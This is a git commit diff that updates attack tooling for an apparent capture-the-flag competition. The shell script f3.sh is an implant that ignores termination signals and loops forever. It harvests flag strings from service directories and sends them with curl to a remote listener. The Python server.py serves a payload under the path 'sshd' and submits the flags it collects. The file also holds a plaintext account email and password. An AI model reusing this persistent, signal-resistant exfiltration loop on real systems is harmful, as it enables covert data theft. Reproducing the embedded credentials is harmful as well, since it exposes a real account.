c882c7c823cde17c7186a47bd06017136f808daf
Suraj Shah <ssshah22@asu.edu>
2017-05-02 01:42:37 +0000

    updates

--- serverTest/f3.sh
+++ serverTest/f3.sh
@@ -3,13 +3,13 @@
 HOST="team2"
 PORT="8888"
 
-trap : HUP KILL TERM STOP TSTP
+trap : HUP INT KILL TERM STOP TSTP
 
 while :; do
 for SVC in `find /opt/ctf/ -name append -type d`;
 do
-	FLAGS=`find $SVC -type f -cmin -3 -exec grep -o 'FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
+	FLAGS=`find $SVC -type f -cmin -3 -exec grep -o '^FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
 	curl  "$HOST:$PORT/$FLAGS"
-	sleep 1
+	sleep 3m
 done
 done
--- serverTest/server.py
+++ serverTest/server.py
@@ -6,7 +6,7 @@ HOST=''
 PORT=8888
 
 # Login config
-TEAM_SERVER='http://35.167.152.77/'
+TEAM_SERVER='http://35.160.215.67/'
 USER='surajshah525@gmail.com'
 PASS='2cZXX5C6bBMq'
 
@@ -14,23 +14,23 @@ PASS='2cZXX5C6bBMq'
 FILE='./ff.sh'
 
 # Submit Server
-submit=None
+server=None
 
 class GetHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
 		path = self.path.lstrip('/')
-		print path
 		if path == 'sshd':
 			with open(FILE, 'rb') as f:
 				self.wfile.write(f.read())
 		if path.startswith('FLG'):
 			flags = path.split('/')
-			server.submit(flags)
+			print flags
+			server.submit_flag(flags)
 
 def run():
-	global SERVER
+	global server
 	i = iCTF(TEAM_SERVER)
-	SERVER = i.login(USER, PASS)
+	server = i.login(USER, PASS)
 	server_address = (HOST, PORT)
 	httpd = HTTPServer(server_address, GetHandler)
 	httpd.serve_forever()
